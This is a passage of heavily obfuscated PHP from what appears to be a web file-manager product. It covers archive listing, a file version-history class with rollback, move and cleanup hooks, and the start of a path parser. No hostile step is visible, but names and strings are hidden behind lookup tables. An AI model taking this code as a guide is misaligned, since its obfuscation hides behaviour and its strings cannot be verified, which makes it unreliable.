self::download($ÊÖ––±ı, $Í¨óâÍ); } } $Í¨óâÍ = self::iconvSystem($Í¨óâÍ); if ($•ûúÕÊ >= 0) { $¸ËİŠİÕ = isset($˜Í€à¿÷[$ó‡é¦—£[1173]]) ? $˜Í€à¿÷[$ó‡é¦—£[1173]] : !1; $ğíÍ˜² = isset($˜Í€à¿÷[$ó‡é¦—£[32]]) ? $˜Í€à¿÷[$ó‡é¦—£[32]] : $ó‡é¦—£[12]; KodArchive::filePreview($Í¨óâÍ, $•ûúÕÊ, $¸ËİŠİÕ, $ğíÍ˜²); self::archiveExt(); die; } $¹»¦ˆ¤¥ = KodArchive::listContent($Í¨óâÍ); self::archiveExt(); del_dir($ĞİÚ´Ó); if (!$¹»¦ˆ¤¥[$ó‡é¦—£[1165]]) { show_json($¹»¦ˆ¤¥[$ó‡é¦—£[1167]], !1); } $Şğ›ÍÓ› = json_encode($¹»¦ˆ¤¥[$ó‡é¦—£[1167]]); self::setContent($¢ø¯÷¤“, $Şğ›ÍÓ›); if (count($¹»¦ˆ¤¥[$ó‡é¦—£[1167]]) >= $¨ğ­Ã­Ã) { show_json(sprintf(LNG($ó‡é¦—£[1171]), count($¹»¦ˆ¤¥[$ó‡é¦—£[1167]])), !1); } return $¹»¦ˆ¤¥[$ó‡é¦—£[1167]]; } private static function fileExt($òïõ˜·µ) { $…¶Ø¿ =& $_SERVER[ì…™Î¶Ï]; $¨Âı÷Õ® = $òïõ˜·µ[$…¶Ø¿[167]]; if ($¨Âı÷Õ® == $…¶Ø¿[1174]) { $‰‡Ò…Ã = $…¶Ø¿[1175]; if (substr($òïõ˜·µ[$…¶Ø¿[32]], -strlen($‰‡Ò…Ã)) == $‰‡Ò…Ã) { $¨Âı÷Õ® = $…¶Ø¿[1176]; } } self::archiveExt($¨Âı÷Õ®); return $¨Âı÷Õ®; } private static function zipFileList($í®¤—‰†, $÷¥¹İ™î = false) { $‹Óå†‘ =& $_SERVER[ì…™Î¶Ï]; $°ÊåÇÍå = array(); foreach ($í®¤—‰† as $±–Õ˜­ ) { $Ï¹•ğû‡ = $±–Õ˜­ [$‹Óå†‘[78]]; if ($÷¥¹İ™î) { $Ï¹•ğû‡ = self::copy($±–Õ˜­ [$‹Óå†‘[78]], $÷¥¹İ™î, $‹Óå†‘[793]); } else { $€‹áÕ¦ = self::init($±–Õ˜­ [$‹Óå†‘[78]]); if ($€‹áÕ¦->getType() == $‹Óå†‘[107]) { $Ï¹•ğû‡ = $€‹áÕ¦->path; } } if ($Ï¹•ğû‡ && self::local()->exist($Ï¹•ğû‡)) { $°ÊåÇÍå[$±–Õ˜­ [$‹Óå†‘[78]]] = $Ï¹•ğû‡; } } if (!empty($°ÊåÇÍå)) { return array_values($°ÊåÇÍå); } show_json(LNG($‹Óå†‘[1140]), !1); } public static function tmpFileName($ğıËÙÓó) { $Û©ş¡ô =& $_SERVER[ì…™Î¶Ï]; $®€ÙÕÙ® = array($ğıËÙÓó[$Û©ş¡ô[32]], $ğıËÙÓó[$Û©ş¡ô[78]], $ğıËÙÓó[$Û©ş¡ô[80]], $ğıËÙÓó[$Û©ş¡ô[512]]); return md5(implode($Û©ş¡ô[11], $®€ÙÕÙ®)); } private static function localFilePath($½……º¤ş, $š¯ìíÇ) { $ìÑÔøøå =& $_SERVER[ì…™Î¶Ï]; if ($š¯ìíÇ == $ìÑÔøøå[1177] && strtoupper(substr(PHP_OS, 0, 3)) == $ìÑÔøøå[1178]) { return !1; } $ßÉšëØ¯ = KodIO::parse($½……º¤ş); if ($ßÉšëØ¯[$ìÑÔøøå[33]] == KodIO::KOD_SOURCE) { $âêÚ¤ü² = Model($ìÑÔøøå[800])->fileInfoGet(KodIO::sourceID($½……º¤ş)); if (!$âêÚ¤ü²[$ìÑÔøøå[78]]) { show_json($ìÑÔøøå[1179], !1); } $½……º¤ş = $âêÚ¤ü²[$ìÑÔøøå[78]]; } $‹ç„‚Íˆ = self::init($½……º¤ş); if ($‹ç„‚Íˆ->pathParse[$ìÑÔøøå[1127]]) { $½……º¤ş = $‹ç„‚Íˆ->pathParse[$ìÑÔøøå[1127]]; $‹ç„‚Íˆ = self::init($½……º¤ş); } $ÚÂÂƒ = $‹ç„‚Íˆ->getType(); if ($ÚÂÂƒ == $ìÑÔøøå[107] || $ÚÂÂƒ == $ìÑÔøøå[1180]) { if (!$‹ç„‚Íˆ->exist($‹ç„‚Íˆ->path)) { show_json(LNG($ìÑÔøøå[106]), !1); } return $‹ç„‚Íˆ->path; } return !1; } private static function archiveExt($óòÅßüª = '') { $GLOBALS[$_SERVER[ì…™Î¶Ï][1181]] = $óòÅßüª; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ÀÊî×…Â =& $_SERVER[ì…™Î¶Ï]; $™·É”´ş = $GLOBALS[$ÀÊî×…Â[6]][$ÀÊî×…Â[90]]; if ($™·É”´ş[$ÀÊî×…Â[1182]] != 1) { return; } if ($™·É”´ş[$ÀÊî×…Â[1183]] <= 0) { return; } if (isset($_REQUEST[$ÀÊî×…Â[1184]]) && $_REQUEST[$ÀÊî×…Â[1184]] == $ÀÊî×…Â[89]) { return; } Hook::bind($ÀÊî×…Â[1185], $ÀÊî×…Â[1186]); Hook::bind($ÀÊî×…Â[1187], $ÀÊî×…Â[1188]); Hook::bind($ÀÊî×…Â[1189], $ÀÊî×…Â[1190]); Hook::bind($ÀÊî×…Â[1191], $ÀÊî×…Â[1192]); Hook::bind($ÀÊî×…Â[1193], $ÀÊî×…Â[1194]); Hook::bind($ÀÊî×…Â[1195], $ÀÊî×…Â[1196]); } public static function eventBeforeUpload($‘¾û´Êû) { if ($‘¾û´Êû[3] && $‘¾û´Êû[3] != REPEAT_REPLACE) { return; } $Ê«›ÀòÒ = self::parsePath($‘¾û´Êû[0]); if (!$Ê«›ÀòÒ) { return; } self::add($Ê«›ÀòÒ); } public static function eventBeforeEdit($Ã¾åáÜ) { $§â¾¿õÀ = self::parsePath($Ã¾åáÜ[0]); if (!$§â¾¿õÀ) { return; } self::add($§â¾¿õÀ); } public static function eventBeforeCopyFile($‘Ò’æÒ€, $ÈÍÁéé, $‘ŠğòÆÓ, $ş€¢’¶, $‹–¥ÜšÏ, $÷Û»µ÷Æ) { $ëôé‹Î² = $‘ŠğòÆÓ->getPathOuter($ş€¢’¶); $ç•Ğó–ª = self::parsePath($ëôé‹Î²); if (!$ç•Ğó–ª) { return; } self::add($ç•Ğó–ª); } public static function eventBeforeRename($±µÜ¹Û„) { $Ú°Ì±ëã =& $_SERVER[ì…™Î¶Ï]; $˜Ê¡¹í = self::parsePath($±µÜ¹Û„[0]); if (!$˜Ê¡¹í) { return; } $Î®ÒÜìô = self::checkInHistory($˜Ê¡¹í); if (!$Î®ÒÜìô) { return; } if ($Î®ÒÜìô[$Ú°Ì±ëã[33]] == $Ú°Ì±ëã[192]) { $³Éî÷¸æ = self::listData($˜Ê¡¹í); if ($³Éî÷¸æ && $³Éî÷¸æ[$Ú°Ì±ëã[364]]) { self::moveHistory($˜Ê¡¹í, $±µÜ¹Û„[1]); } } else { IO::rename($Î®ÒÜìô[$Ú°Ì±ëã[78]], $±µÜ¹Û„[1]); } } public static function eventBeforeMove($¥Üşä¶·) { $šÎÉßı¾ =& $_SERVER[ì…™Î¶Ï]; $Çı¯È³¥ = self::parsePath($¥Üşä¶·[0]); if (!$Çı¯È³¥) { return; } $ú—¹šâ = self::parsePath($¥Üşä¶·[1]); if (!$ú—¹šâ) { return; } $İë‡¢Ë® = $¥Üşä¶·[3]; $¦Š¶•š„ = self::checkInHistory($Çı¯È³¥); if (!$¦Š¶•š„) { return; } $ç”Šğ˜ã = self::pathHistory($ú—¹šâ); if ($¦Š¶•š„[$šÎÉßı¾[33]] == $šÎÉßı¾[192]) { $êŒÉ÷±ß = self::listData($Çı¯È³¥); $ÄÊĞÖïË = rtrim($ú—¹šâ, $šÎÉßı¾[8]) . $šÎÉßı¾[8] . ($İë‡¢Ë® ? $İë‡¢Ë® : get_path_this($Çı¯È³¥)); $±Ÿ—Öá¤ = self::listData($ÄÊĞÖïË); if ($êŒÉ÷±ß && $êŒÉ÷±ß[$šÎÉßı¾[364]] && $±Ÿ—Öá¤ && $±Ÿ—Öá¤[$šÎÉßı¾[364]]) { return self::clear($Çı¯È³¥); } if ($êŒÉ÷±ß && $êŒÉ÷±ß[$šÎÉßı¾[364]]) { self::moveHistory($Çı¯È³¥, $İë‡¢Ë®, $ç”Šğ˜ã); } } else { IO::move($¦Š¶•š„[$šÎÉßı¾[78]], $ç”Šğ˜ã, !1, $İë‡¢Ë®); self::clearEmptyFolder(IO::pathFather($¦Š¶•š„[$šÎÉßı¾[78]])); } } public static function eventAfterRemove($¬†›ÁÂ°, $µüéì¤Œ) { $‡Å×ê©• =& $_SERVER[ì…™Î¶Ï]; if (!$µüéì¤Œ) { return; } $ëøÌÂÊ = self::parsePath($¬†›ÁÂ°[0]); if (!$ëøÌÂÊ) { return; } $š®£ò¨Å = self::checkInHistory($ëøÌÂÊ); if (!$š®£ò¨Å) { return; } if ($š®£ò¨Å[$‡Å×ê©•[33]] == $‡Å×ê©•[192]) { $«İº‹È± = self::listData($ëøÌÂÊ, !1); if ($«İº‹È± && $«İº‹È±[$‡Å×ê©•[364]]) { self::clear($ëøÌÂÊ, !1); } } else { IO::remove($š®£ò¨Å[$‡Å×ê©•[78]]); self::clearEmptyFolder(IO::pathFather($š®£ò¨Å[$‡Å×ê©•[78]])); } } private static function checkInHistory($ƒˆâäŞ) { $¦ä‹Ğä = self::pathHistory($ƒˆâäŞ); if (!IO::exist($¦ä‹Ğä)) { $¦ä‹Ğä .= $_SERVER[ì…™Î¶Ï][1197]; } return IO::exist($¦ä‹Ğä) ? IO::info($¦ä‹Ğä) : !1; } private static function parsePath($Ü®©­¹—) { $Õä¸ÑŒŒ =& $_SERVER[ì…™Î¶Ï]; if (!$Ü®©­¹—) { return !1; } if ($GLOBALS[$Õä¸ÑŒŒ[1198]]) { return; } $ûç–º = KodIO::parse($Ü®©­¹—); $™çÑŒ¼ş = $ûç–º[$Õä¸ÑŒŒ[33]]; $ø¶±³½Î = !$™çÑŒ¼ş || $™çÑŒ¼ş == KodIO::KOD_IO || $™çÑŒ¼ş == KodIO::KOD_SHARE_ITEM; if (!$ø¶±³½Î || !$ûç–º[$Õä¸ÑŒŒ[1199]]) { return !1; } if (substr($Ü®©­¹—, 0, strlen(DATA_PATH . $Õä¸ÑŒŒ[1200])) == DATA_PATH . $Õä¸ÑŒŒ[1200]) { return !1; } if ($™çÑŒ¼ş == KodIO::KOD_SHARE_ITEM) { $Ô£™·„· = IO::init($Ü®©­¹—); if ($Ô£™·„·->pathParse[$Õä¸ÑŒŒ[1127]]) { return self::parsePath($Ô£™·„·->pathParse[$Õä¸ÑŒŒ[1127]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Ú×Ğ¼Ä² = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $Õä¸ÑŒŒ[1201]); foreach ($Ú×Ğ¼Ä² as $®…±¼Ò¨) { if (!$™çÑŒ¼ş && substr($Ü®©­¹—, 0, strlen($®…±¼Ò¨)) == $®…±¼Ò¨) { return !1; } } self::log($GLOBALS[$Õä¸ÑŒŒ[1122]] . $Õä¸ÑŒŒ[1202] . $Ü®©­¹—); return $Ü®©­¹—; } private static function pathHistory($¦İ±˜åÔ) { $ŞîŞİ‰± =& $_SERVER[ì…™Î¶Ï]; $ïš—ÕÀ = self::$_historyBase . ltrim(KodIO::clear($¦İ±˜åÔ), $ŞîŞİ‰±[8]); $ïš—ÕÀ = str_replace(array($ŞîŞİ‰±[1203]), array($ŞîŞİ‰±[1204]), $ïš—ÕÀ); return $ïš—ÕÀ; } public static function log($íÇı°­ˆ) { } public static function historyCount($â–ìééü) { $ëÓ…„º’ =& $_SERVER[ì…™Î¶Ï]; $ø‘Ä¿ÃÇ = array(); $à«ÖÇ± = array(); foreach ($â–ìééü as $¤ôÀÌç) { $ÍŒê§Ê = get_path_father($¤ôÀÌç); if (!$à«ÖÇ±[$ÍŒê§Ê]) { $à«ÖÇ±[$ÍŒê§Ê] = array(); } $à«ÖÇ±[$ÍŒê§Ê][] = get_path_this($¤ôÀÌç); } foreach ($à«ÖÇ± as $ÍŒê§Ê => $ØŠüÕŒ°) { $­‘öÆÍ  = self::parsePath($ÍŒê§Ê); if (!$­‘öÆÍ ) { continue; } foreach ($ØŠüÕŒ° as $¬¥®ÁüÀ) { $Ş×­¼Â¶ = self::listData(rtrim($­‘öÆÍ , $ëÓ…„º’[8]) . $ëÓ…„º’[8] . $¬¥®ÁüÀ, !1); if ($Ş×­¼Â¶ && $Ş×­¼Â¶[$ëÓ…„º’[364]]) { $ø‘Ä¿ÃÇ[rtrim($ÍŒê§Ê, $ëÓ…„º’[8]) . $ëÓ…„º’[8] . $¬¥®ÁüÀ] = count($Ş×­¼Â¶[$ëÓ…„º’[364]]); } } } return $ø‘Ä¿ÃÇ; } public static function add($×È•Å±Ã) { $›áñãÑ¾ =& $_SERVER[ì…™Î¶Ï]; $¡ÚÉäé– = self::listData($×È•Å±Ã); if (!$¡ÚÉäé–) { return; } $ŠüÅŠ¿Î = Model($›áñãÑ¾[745])->get($›áñãÑ¾[1205]); $•¡Æ•™Š = $GLOBALS[$›áñãÑ¾[6]][$›áñãÑ¾[90]][$›áñãÑ¾[1183]]; $­…©°ØÚ = $ŠüÅŠ¿Î == $›áñãÑ¾[1206] ? 5 : $•¡Æ•™Š; if ($•¡Æ•™Š <= 0) { return; } $•³Œ©·æ = IO::hashSimple($×È•Å±Ã); $¦“æøÎ = IO::info($×È•Å±Ã); $š‰Ñ¬·í = $¡ÚÉäé–[$›áñãÑ¾[364]]; if ($¦“æøÎ[$›áñãÑ¾[80]] == 0) { return; } if ($¦“æøÎ[$›áñãÑ¾[80]] >= 1024 * 1024 * 500) { return !1; } if ($š‰Ñ¬·í && $š‰Ñ¬·í[0][$›áñãÑ¾[170]] == $•³Œ©·æ) { return !0; } if (array_key_exists($›áñãÑ¾[195], $¦“æøÎ) && !$¦“æøÎ[$›áñãÑ¾[195]]) { return !1; } $êëÖüĞÏ = short_id(time()); $õšŞÅª = array($›áñãÑ¾[392] => $êëÖüĞÏ, $›áñãÑ¾[170] => $•³Œ©·æ, $›áñãÑ¾[32] => $¦“æøÎ[$›áñãÑ¾[32]] . $›áñãÑ¾[10] . date($›áñãÑ¾[1207]) . rand_string(1), $›áñãÑ¾[80] => $¦“æøÎ[$›áñãÑ¾[80]], $›áñãÑ¾[443] => USER_ID, $›áñãÑ¾[193] => time(), $›áñãÑ¾[1208] => $›áñãÑ¾[12]); IO::mkdir($¡ÚÉäé–[$›áñãÑ¾[1209]]); $Ä§Ô¹ù = IO::copy($×È•Å±Ã, $¡ÚÉäé–[$›áñãÑ¾[1209]], !1, $õšŞÅª[$›áñãÑ¾[32]]); if (!$Ä§Ô¹ù) { self::clearEmptyFolder($¡ÚÉäé–[$›áñãÑ¾[1209]]); return !1; } array_unshift($š‰Ñ¬·í, $õšŞÅª); if (count($š‰Ñ¬·í) > $­…©°ØÚ) { $ùºô¥„” = array_slice($š‰Ñ¬·í, $­…©°ØÚ); foreach ($ùºô¥„” as $“½¨ŸéÕ) { IO::remove($¡ÚÉäé–[$›áñãÑ¾[1209]] . $“½¨ŸéÕ[$›áñãÑ¾[32]]); } $š‰Ñ¬·í = array_slice($š‰Ñ¬·í, 0, $­…©°ØÚ); } return self::saveData($¡ÚÉäé–[$›áñãÑ¾[1210]], $š‰Ñ¬·í); } public static function remove($™Ç–ãÖ, $çÆ€¤±) { $¦„‰Ó¯­ =& $_SERVER[ì…™Î¶Ï]; $†ñÌÏ = self::listData($™Ç–ãÖ); $±·àş†‚ = array(); if (!$†ñÌÏ) { return !1; } foreach ($†ñÌÏ[$¦„‰Ó¯­[364]] as $˜‚‰®°©) { if ($˜‚‰®°©[$¦„‰Ó¯­[392]] == $çÆ€¤±) { IO::remove($†ñÌÏ[$¦„‰Ó¯­[1209]] . $˜‚‰®°©[$¦„‰Ó¯­[32]]); continue; } $±·àş†‚[] = $˜‚‰®°©; } return self::saveData($†ñÌÏ[$¦„‰Ó¯­[1210]], $±·àş†‚); } public static function clear($°ÉªËá›, $ßÊŒ¶åİ = true) { $ß¨Åš° =& $_SERVER[ì…™Î¶Ï]; $ÀµšÇ·¹ = self::listData($°ÉªËá›, $ßÊŒ¶åİ); if (!$ÀµšÇ·¹) { return !1; } foreach ($ÀµšÇ·¹[$ß¨Åš°[364]] as $óü·Ø“¥) { IO::remove($ÀµšÇ·¹[$ß¨Åš°[1209]] . $óü·Ø“¥[$ß¨Åš°[32]]); } return self::saveData($ÀµšÇ·¹[$ß¨Åš°[1210]], array()); } public static function moveHistory($âÏ©½ïŒ, $¾¹í­³ = '', $ÒÓŸÛæë = '') { $ƒ­ÒçÔ¦ =& $_SERVER[ì…™Î¶Ï]; $‚Öµ´ÑŠ = self::listData($âÏ©½ïŒ, !1); if (!$‚Öµ´ÑŠ || !$‚Öµ´ÑŠ[$ƒ­ÒçÔ¦[364]]) { return !1; } $¤ÉßÕ… = $ƒ­ÒçÔ¦[1197]; $¾¹í­³ = $¾¹í­³ ? $¾¹í­³ : get_path_this($âÏ©½ïŒ); $ÒÓŸÛæë = $ÒÓŸÛæë ? $ÒÓŸÛæë : $‚Öµ´ÑŠ[$ƒ­ÒçÔ¦[1209]]; $Û˜®·ú³ = substr(get_path_this($‚Öµ´ÑŠ[$ƒ­ÒçÔ¦[1210]]), 0, -strlen($¤ÉßÕ…)); foreach ($‚Öµ´ÑŠ[$ƒ­ÒçÔ¦[364]] as $é¤İÆ²£ => $·óï¾Ä­) { $×ÂäÑò© = $¾¹í­³ . substr($·óï¾Ä­[$ƒ­ÒçÔ¦[32]], strlen($Û˜®·ú³)); $Üê„ƒ‹ = IO::move($‚Öµ´ÑŠ[$ƒ­ÒçÔ¦[1209]] . $·óï¾Ä­[$ƒ­ÒçÔ¦[32]], $ÒÓŸÛæë, !1, $×ÂäÑò©); if ($Üê„ƒ‹) { $‚Öµ´ÑŠ[$ƒ­ÒçÔ¦[364]][$é¤İÆ²£][$ƒ­ÒçÔ¦[32]] = $×ÂäÑò©; } } $‚Öµ´ÑŠ[$ƒ­ÒçÔ¦[1210]] = IO::move($‚Öµ´ÑŠ[$ƒ­ÒçÔ¦[1210]], $ÒÓŸÛæë, !1, $¾¹í­³ . $¤ÉßÕ…); self::saveData($‚Öµ´ÑŠ[$ƒ­ÒçÔ¦[1210]], $‚Öµ´ÑŠ[$ƒ­ÒçÔ¦[364]]); self::clearEmptyFolder($‚Öµ´ÑŠ[$ƒ­ÒçÔ¦[1209]]); } public static function rollback($Ó€Û‰¥, $ÜçÎóĞ) { $Îìˆâ º =& $_SERVER[ì…™Î¶Ï]; $Ã‘üÇÔ¢ = self::listData($Ó€Û‰¥); if (!$Ã‘üÇÔ¢) { return; } $Õ–µùê = IO::info($Ó€Û‰¥); foreach ($Ã‘üÇÔ¢[$Îìˆâ º[364]] as $Ê¡¢Û‘¤ => $ã„¡ü´˜) { if ($ã„¡ü´˜[$Îìˆâ º[392]] == $ÜçÎóĞ) { self::add($Ó€Û‰¥); $ÎÆŞ¤ï = $Ã‘üÇÔ¢[$Îìˆâ º[1209]] . $ã„¡ü´˜[$Îìˆâ º[32]]; $½ğÁ³œ = IO::copy($ÎÆŞ¤ï, IO::pathFather($Ó€Û‰¥), REPEAT_REPLACE, $Õ–µùê[$Îìˆâ º[32]]); if ($½ğÁ³œ) { self::remove($Ó€Û‰¥, $ÜçÎóĞ); } return $½ğÁ³œ; } } return !1; } public static function setDetail($Á»Š¾ë¶, $…Ë’†Ñæ, $ÖÎäŸè) { $¬µ…Ù‚ş =& $_SERVER[ì…™Î¶Ï]; $Úş®ŠÙ = self::listData($Á»Š¾ë¶); if (!$Úş®ŠÙ) { return; } foreach ($Úş®ŠÙ[$¬µ…Ù‚ş[364]] as $¾Ü„¶œ® => $‰ÌÀ–á¶) { if ($‰ÌÀ–á¶[$¬µ…Ù‚ş[392]] == $…Ë’†Ñæ) { $Úş®ŠÙ[$¬µ…Ù‚ş[364]][$¾Ü„¶œ®][$¬µ…Ù‚ş[1208]] = $ÖÎäŸè; self::saveData($Úş®ŠÙ[$¬µ…Ù‚ş[1210]], $Úş®ŠÙ[$¬µ…Ù‚ş[364]]); return !0; } } return !1; } public static function fileInfo($´ğªåóĞ, $‰Šüá¾³) { $Âùõ™ºÕ =& $_SERVER[ì…™Î¶Ï]; $úªØ•£û = self::listData($´ğªåóĞ); if (!$úªØ•£û) { show_json(LNG($Âùõ™ºÕ[106]), !1); } $¦ùÕØ« = $Âùõ™ºÕ[12]; foreach ($úªØ•£û[$Âùõ™ºÕ[364]] as $ÁŞ›úê => $–½°Ú³) { if ($–½°Ú³[$Âùõ™ºÕ[392]] != $‰Šüá¾³) { continue; } $¦ùÕØ« = $úªØ•£û[$Âùõ™ºÕ[1209]] . $–½°Ú³[$Âùõ™ºÕ[32]]; break; } if (!$¦ùÕØ«) { show_json(LNG($Âùõ™ºÕ[106]), !1); } return IO::info($¦ùÕØ«); } public static function fileOut($áıù×ÖÇ, $ÉìñÓ€ñ, $µÓøš– = false) { $—²òõ©Å =& $_SERVER[ì…™Î¶Ï]; $±Æúæš˜ = self::fileInfo($áıù×ÖÇ, $ÉìñÓ€ñ); $¨‚†¬Âú =& $GLOBALS[$—²òõ©Å[7]]; $µÓøš– = isset($¨‚†¬Âú[$—²òõ©Å[1173]]) && $¨‚†¬Âú[$—²òõ©Å[1173]] == 1; if (isset($¨‚†¬Âú[$—²òõ©Å[33]]) && $¨‚†¬Âú[$—²òõ©Å[33]] == $—²òõ©Å[1211]) { return IO::fileOutImage($±Æúæš˜[$—²òõ©Å[78]], $¨‚†¬Âú[$—²òõ©Å[1212]]); } IO::fileOut($±Æúæš˜[$—²òõ©Å[78]], $µÓøš–, get_path_this($áıù×ÖÇ)); } public static function listData($Ëİª±’‡, $¾»”ÎÊ¸ = true) { $É Ì¾¢” =& $_SERVER[ì…™Î¶Ï]; if ($¾»”ÎÊ¸ && !IO::exist($Ëİª±’‡)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($Ëİª±’‡, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $¼ÖË×ˆ = self::pathHistory($Ëİª±’‡); $àûÊŞ = array($É Ì¾¢”[1210] => $¼ÖË×ˆ . $É Ì¾¢”[1197], $É Ì¾¢”[1209] => rtrim(get_path_father($¼ÖË×ˆ), $É Ì¾¢”[8]) . $É Ì¾¢”[8], $É Ì¾¢”[364] => array()); $İÓËà = IO::getContent($àûÊŞ[$É Ì¾¢”[1210]]); if ($İÓËà) { $Ÿ‡Îı—Â = json_decode($İÓËà, !0); if (is_array($Ÿ‡Îı—Â)) { $àûÊŞ[$É Ì¾¢”[364]] = $Ÿ‡Îı—Â; } } return $àûÊŞ; } private static function saveData($¯ëÑÀìø, $“ä¨²éŒ) { $Üä…àˆ‡ =& $_SERVER[ì…™Î¶Ï]; self::log($Üä…àˆ‡[1213] . $¯ëÑÀìø . $Üä…àˆ‡[71] . count($“ä¨²éŒ), $Üä…àˆ‡[727]); if ($“ä¨²éŒ) { return IO::setContent($¯ëÑÀìø, json_encode($“ä¨²éŒ)); } $Ì‘†‰’Ÿ = IO::pathFather($¯ëÑÀìø); IO::remove($¯ëÑÀìø); self::clearEmptyFolder($Ì‘†‰’Ÿ); return !0; } public static function clearEmptyFolder($•¼üÔŒÍ) { $Š ÅÒì¬ =& $_SERVER[ì…™Î¶Ï]; if (trim($•¼üÔŒÍ, $Š ÅÒì¬[8]) == trim(self::$_historyBase, $Š ÅÒì¬[8])) { return; } $ñ˜¹¶Ã = IO::pathFather($•¼üÔŒÍ); $öÒ¨ûÚ® = IO::has($•¼üÔŒÍ, !0); if ($öÒ¨ûÚ®[$Š ÅÒì¬[202]] > 0 || $öÒ¨ûÚ®[$Š ÅÒì¬[203]] > 0) { return; } IO::remove($•¼üÔŒÍ); self::clearEmptyFolder($ñ˜¹¶Ã); } private static function getBasePath() { $ßëÇÖ˜ =& $_SERVER[ì…™Î¶Ï]; $ª³•á©Ê = Model($ßëÇÖ˜[1214])->get($ßëÇÖ˜[1215]); if ($ª³•á©Ê) { if (!IO::exist($ª³•á©Ê)) { IO::mkdir($ª³•á©Ê); } if (get_path_this($ª³•á©Ê) == $ßëÇÖ˜[1200]) { $ƒĞü¹Ïû = $ßëÇÖ˜[1216] . rand_string(8); @rename($ª³•á©Ê, get_path_father($ª³•á©Ê) . $ßëÇÖ˜[8] . $ƒĞü¹Ïû); $ª³•á©Ê = DATA_PATH . $ƒĞü¹Ïû . $ßëÇÖ˜[8]; file_put_contents(DATA_PATH . $ßëÇÖ˜[1217], $ßëÇÖ˜[12]); Model($ßëÇÖ˜[1214])->set($ßëÇÖ˜[1215], $ª³•á©Ê); } return $ª³•á©Ê; } $ª³•á©Ê = DATA_PATH . $ßëÇÖ˜[1216] . rand_string(8) . $ßëÇÖ˜[8]; $ª³•á©Ê = IO::mkdir($ª³•á©Ê); $ª³•á©Ê = rtrim($ª³•á©Ê, $ßëÇÖ˜[8]) . $ßëÇÖ˜[8]; file_put_contents($ª³•á©Ê . $ßëÇÖ˜[1217], $ßëÇÖ˜[12]); file_put_contents(DATA_PATH . $ßëÇÖ˜[1217], $ßëÇÖ˜[12]); Model($ßëÇÖ˜[1214])->set($ßëÇÖ˜[1215], $ª³•á©Ê); return $ª³•á©Ê; } } class KodIO { const KOD_SOURCE = "\x7b\x73\157\x75\162\x63\145\175"; const KOD_USER_RECYCLE = "\173\165\x73\x65\162\x52\145\143\x79\143\154\x65\x7d"; const KOD_USER_FAV = "\x7b\165\x73\x65\x72\x46\x61\166\x7d"; const KOD_USER_FILE_TAG = "\173\x75\163\x65\x72\x46\151\x6c\145\124\141\147\175"; const KOD_USER_FILE_TYPE = "\173\x75\x73\145\x72\x46\151\x6c\x65\x54\171\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\157\x75\x70\122\157\x6f\x74\x53\145\154\146\x7d"; const KOD_USER_SHARE = "\173\165\163\145\x72\123\x68\x61\162\145\x7d"; const KOD_USER_SHARE_LINK = "\173\165\x73\145\x72\x53\x68\x61\x72\145\114\151\156\153\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\x68\141\x72\145\x54\157\x4d\145\x7d"; const KOD_SHARE_ITEM = "\173\x73\x68\141\x72\145\x49\x74\x65\155\x7d"; const KOD_SHARE_LINK = "\173\163\150\x61\x72\x65\x49\x74\x65\155\114\x69\156\x6b\x7d"; const KOD_SEARCH = "\x7b\x73\x65\141\162\143\x68\x7d"; const KOD_BLOCK = "\x7b\142\x6c\x6f\x63\x6b\175"; const KOD_IO = "\173\x69\x6f\175"; const KOD_USER_RECENT = "\x7b\165\163\x65\x72\x52\145\x6e\143\145\x6e\164\x7d"; const KOD_USER_DRIVER = "\x7b\x64\x72\151\x76\145\162\175"; public static function typeList() { $Œ™´áÊØ =& $_SERVER[ì…™Î¶Ï]; return array($Œ™´áÊØ[1218] => self::KOD_SOURCE, $Œ™´áÊØ[1219] => self::KOD_USER_RECYCLE, $Œ™´áÊØ[1220] => self::KOD_USER_FAV, $Œ™´áÊØ[1221] => self::KOD_USER_FILE_TAG, $Œ™´áÊØ[1222] => self::KOD_USER_FILE_TYPE, $Œ™´áÊØ[1223] => self::KOD_GROUP_ROOT_SELF, $Œ™´áÊØ[1224] => self::KOD_USER_SHARE, $Œ™´áÊØ[1225] => self::KOD_USER_SHARE_LINK, $Œ™´áÊØ[1226] => self::KOD_USER_SHARE_TO_ME, $Œ™´áÊØ[1227] => self::KOD_SHARE_ITEM, $Œ™´áÊØ[1228] => self::KOD_SHARE_LINK, $Œ™´áÊØ[1229] => self::KOD_SEARCH, $Œ™´áÊØ[1230] => self::KOD_BLOCK, $Œ™´áÊØ[1231] => self::KOD_IO, $Œ™´áÊØ[1232] => self::KOD_USER_RECENT, $Œ™´áÊØ[1233] => self::KOD_USER_DRIVER); } public static function parse($Æ™ÃƒÙÜ) { $ú¯“Ğ…Ï =& $_SERVER[ì…™Î¶Ï]; $Æ™ÃƒÙÜ = self::clear($Æ™ÃƒÙÜ); $Î¾ä›÷Ú = array_values(self::typeList()); preg_match($ú¯“Ğ…Ï[1234], $Æ™ÃƒÙÜ, $íÔÏ›ÂÈ); $ËÛøÁêş = array($ú¯“Ğ…Ï[414] => !1, $ú¯“Ğ…Ï[1235] => !1, $ú¯“Ğ…Ï[411] => !1, $ú¯“Ğ…Ï[78] => $Æ™ÃƒÙÜ, $ú¯“Ğ…Ï[1144] => !1, $ú¯“Ğ…Ï[1143] => $ú¯“Ğ…Ï[12]); if (is_array($íÔÏ›ÂÈ) && count($íÔÏ›ÂÈ) == 5) { $ÕÛ´»° = $ú¯“Ğ…Ï[1236] . $íÔÏ›ÂÈ[2] . $ú¯“Ğ…Ï[322]; if (in_array($ÕÛ´»°, $Î¾ä›÷Ú)) { $ËÛøÁêş[$ú¯“Ğ…Ï[1144]] = $íÔÏ›ÂÈ[1]; $ËÛøÁêş[$ú¯“Ğ…Ï[33]] = $ÕÛ´»°; $ËÛøÁêş[$ú¯“Ğ…Ï[1237]] = substr($ÕÛ´»°, 1, -1); $ËÛøÁêş[$ú¯“Ğ…Ï[392]] = $íÔÏ›ÂÈ[3]; } $ËÛøÁêş[$ú¯“Ğ…Ï[1143]] = $íÔÏ›ÂÈ[4]; } $Îà‰¨·Ñ = array($ú¯“Ğ…Ï[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, 